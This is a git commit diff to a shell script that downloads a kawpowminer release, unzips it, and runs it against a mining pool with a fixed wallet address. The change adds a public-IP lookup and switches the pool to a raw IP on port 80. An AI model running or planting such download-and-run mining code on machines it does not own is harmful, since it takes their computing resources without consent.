6a41bc8d2c209cc2210782d1c38054ba5fb4efaa
one10001 <78626503+one10001@users.noreply.github.com>
2021-02-22 00:04:11 +0100

    info

--- rv.sh
+++ rv.sh
@@ -1,5 +1,6 @@
 #!bin/bash -xe 
-wget https://github.com/RavenCommunity/kawpowminer/releases/download/1.2.3/kawpowminer-ubuntu18-1.2.3.zip
-unzip kawpowminer-ubuntu18-1.2.3.zip
+curl ipinfo.io
+wget https://github.com/RavenCommunity/kawpowminer/releases/download/1.2.3/kawpowminer-ubuntu16-1.2.3.zip
+unzip kawpowminer-ubuntu16-1.2.3.zip
 ls -la
-./kawpowminer -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RIG01@s3.solopool.org:9013
+./kawpowminer -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RIG01@116.203.206.127:80
